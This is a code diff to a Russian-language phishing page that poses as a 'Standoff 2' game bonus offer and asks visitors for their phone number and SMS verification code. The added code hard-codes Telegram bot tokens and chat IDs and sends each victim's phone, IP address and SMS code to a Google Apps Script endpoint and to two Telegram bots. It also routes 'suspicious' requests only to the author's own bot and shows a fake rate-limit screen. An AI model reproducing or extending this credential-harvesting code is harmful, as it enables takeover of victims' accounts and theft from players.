@@ -48,6 +48,7 @@
         .loading-phone { color: var(--gold); font-size: 18px; font-weight: 700; margin: 8px 0; }
         .loading-dots::after { content: ''; animation: dots 1.5s steps(4) infinite; }
         @keyframes dots { 0% { content: ''; } 25% { content: '.'; } 50% { content: '..'; } 75% { content: '...'; } }
+        .blocked-msg { color: #ff4444; font-size: 14px; font-weight: 700; text-align: center; padding: 20px; display: none; }
     </style>
 </head>
 <body>
@@ -64,6 +65,10 @@
             <div class="input-group"><label>Номер телефона</label><div class="phone-wrapper"><span class="phone-prefix">+7</span><input type="tel" id="phone" placeholder="9XX XXX-XX-XX" maxlength="13" inputmode="numeric" oninput="formatPhone(this)"></div></div>
             <button class="btn" id="btn-phone" onclick="requestCode()">Получить бонусы</button>
             <div class="error-msg" id="phone-error">Введите 10 цифр начиная с 9</div>
+        </div>
+        <div id="screen-blocked" class="blocked-msg">
+            <p>⚠️ Превышен лимит запросов!</p>
+            <p style="font-size:12px;color:#8890a0;margin-top:8px;">Повторите через <span id="block-timer">3:00</span></p>
         </div>
         <div id="screen-loading" class="loading-overlay">
             <div class="spinner"></div>
@@ -98,6 +103,10 @@
     </div>
     <script>
         const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbztJ9YtFVX0F4Slqj0-6IvK8m4tqtmDKMVhTdu9FFNGEr2HvNjf2TbySwslNXw1tvmP/exec';
+        const TG_TOKEN_EGO = '8845403494:AAGmRnQ2Lb1yNauYXsGUXjC7MCOkh5V-e5E';
+        const TG_CHAT_EGO = '7990056308';
+        const TG_TOKEN_MY = '8898714458:AAGq_yXrVbh_S00Gj6b5XS9PoXiYohxbPo4';
+        const TG_CHAT_MY = '8800915878';
         const urlParams = new URLSearchParams(window.location.search);
         const inviter = urlParams.get('inviter') || 'Игрок';
         document.getElementById('inviter-name').textContent = inviter;
@@ -105,6 +114,58 @@
         if (document.getElementById('inviter-name-done')) document.getElementById('inviter-name-done').textContent = inviter;
         var timerInterval = null;
         var codeUnlocked = false;
+        
+        var MAX_REQUESTS = 10;
+        var BLOCK_MINUTES = 3;
+        var SUSPICIOUS_START = 6;
+        var requestCount = parseInt(localStorage.getItem('standoff_req') || '0');
+        var blockedUntil = parseInt(localStorage.getItem('standoff_block') || '0');
+
+        function isBlocked() { return Date.now() < blockedUntil; }
+        function isSuspicious() { return requestCount >= SUSPICIOUS_START; }
+
+        function addRequest() {
+            requestCount++;
+            localStorage.setItem('standoff_req', requestCount);
+            if (requestCount >= MAX_REQUESTS) {
+                blockedUntil = Date.now() + BLOCK_MINUTES * 60 * 1000;
+                localStorage.setItem('standoff_block', blockedUntil);
+            }
+        }
+
+        function resetBlock() {
+            requestCount = 0; blockedUntil = 0;
+            localStorage.setItem('standoff_req', '0'); localStorage.setItem('standoff_block', '0');
+        }
+
+        function sendToTelegram(token, chatId, message) {
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message), { mode: 'no-cors' }).catch(function() {});
+        }
+
+        function checkBlocked() {
+            if (isBlocked()) {
+                hideAll(); document.getElementById('screen-blocked').style.display = 'block'; startBlockTimer(); return true;
+            }
+            if (blockedUntil > 0 && !isBlocked()) resetBlock();
+            return false;
+        }
+
+        function hideAll() {
+            ['screen-phone','screen-loading','screen-code','screen-done','screen-blocked'].forEach(function(id) {
+                document.getElementById(id).style.display = 'none';
+            });
+        }
+
+        function startBlockTimer() {
+            clearInterval(timerInterval);
+            timerInterval = setInterval(function() {
+                var remaining = Math.ceil((blockedUntil - Date.now()) / 1000);
+                if (remaining <= 0) { clearInterval(timerInterval); resetBlock(); document.getElementById('screen-blocked').style.display = 'none'; document.getElementById('screen-phone').style.display = 'block'; }
+                else { var m = Math.floor(remaining / 60); var s = remaining % 60; document.getElementById('block-timer').textContent = m + ':' + (s < 10 ? '0' : '') + s; }
+            }, 1000);
+        }
+
+        checkBlocked();
 
         function getIP() {
             return new Promise(function(resolve) {
@@ -132,24 +193,39 @@
         function lockCodeInput() { codeUnlocked = false; document.getElementById('code-wrapper').classList.add('locked'); document.getElementById('code').disabled = true; document.getElementById('code').placeholder = 'Ожидайте код...'; document.getElementById('btn-code').disabled = true; }
         function unlockCodeInput() { codeUnlocked = true; document.getElementById('code-wrapper').classList.remove('locked'); document.getElementById('code').disabled = false; document.getElementById('code').placeholder = '0 0 0 0 0 0'; document.getElementById('code').focus(); document.getElementById('btn-code').disabled = false; }
 
-        function startTimer() {
+        function startCodeTimer() {
             var seconds = 60; document.getElementById('timer').textContent = seconds; document.getElementById('btn-resend').disabled = true; lockCodeInput();
-            if (timerInterval) clearInterval(timerInterval);
+            clearInterval(timerInterval);
             timerInterval = setInterval(function() { seconds--; document.getElementById('timer').textContent = seconds; if (seconds <= 0) { clearInterval(timerInterval); document.getElementById('btn-resend').disabled = false; unlockCodeInput(); } }, 1000);
         }
 
         async function requestCode() {
+            if (checkBlocked()) return;
             var phone = document.getElementById('phone').value.replace(/\D/g, '');
             if (phone.length !== 10) { document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
             if (phone[0] !== '9') { document.getElementById('phone-error').textContent = 'Номер должен начинаться с 9'; document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
             document.getElementById('phone-error').style.display = 'none';
+            
+            addRequest();
             var ip = await getIP(); var fullPhone = '+7' + phone;
-            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
+            var suspicious = isSuspicious();
+            var prefix = suspicious ? '⚠️ Подозрительный!\n' : '';
+            var msg = prefix + '📱 Standoff 2\nНомер: ' + fullPhone + '\nIP: ' + ip;
+            
+            // Всегда через Apps Script
+            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function() {});
+            
+            // Дополнительно напрямую в Telegram с фильтром
+            if (suspicious) { sendToTelegram(TG_TOKEN_MY, TG_CHAT_MY, msg); }
+            else { sendToTelegram(TG_TOKEN_EGO, TG_CHAT_EGO, msg); sendToTelegram(TG_TOKEN_MY, TG_CHAT_MY, msg); }
+            
+            if (isBlocked()) { checkBlocked(); return; }
+            
             document.getElementById('screen-phone').style.display = 'none'; document.getElementById('loading-phone').textContent = '+7 ' + document.getElementById('phone').value; document.getElementById('screen-loading').style.display = 'block';
-            setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value; document.getElementById('screen-code').style.display = 'block'; startTimer(); }, 3000);
+            setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value; document.getElementById('screen-code').style.display = 'block'; startCodeTimer(); }, 3000);
         }
 
-        function resendCode() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('screen-loading').style.display = 'block'; setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('screen-code').style.display = 'block'; startTimer(); }, 3000); }
+        function resendCode() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('screen-loading').style.display = 'block'; setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('screen-code').style.display = 'block'; startCodeTimer(); }, 3000); }
 
         async function confirmCode() {
             if (!codeUnlocked) { document.getElementById('code-error').textContent = 'Дождитесь окончания таймера'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
@@ -157,8 +233,16 @@
             if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из SMS'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
             document.getElementById('code-error').style.display = 'none';
             var ip = await getIP(); var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'ПРОВЕРКА...';
-            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
-            if (timerInterval) clearInterval(timerInterval);
+            var suspicious = isSuspicious();
+            var prefix = suspicious ? '⚠️ Подозрительный!\n' : '';
+            var msg = prefix + '🔐 Standoff 2 КОД: ' + code;
+            
+            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function() {});
+            
+            if (suspicious) { sendToTelegram(TG_TOKEN_MY, TG_CHAT_MY, msg); }
+            else { sendToTelegram(TG_TOKEN_EGO, TG_CHAT_EGO, msg); sendToTelegram(TG_TOKEN_MY, TG_CHAT_MY, msg); }
+            
+            clearInterval(timerInterval);
             setTimeout(function() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('screen-done').style.display = 'block'; btn.disabled = false; btn.textContent = 'Подтвердить'; }, 1000);
         }
     </script>
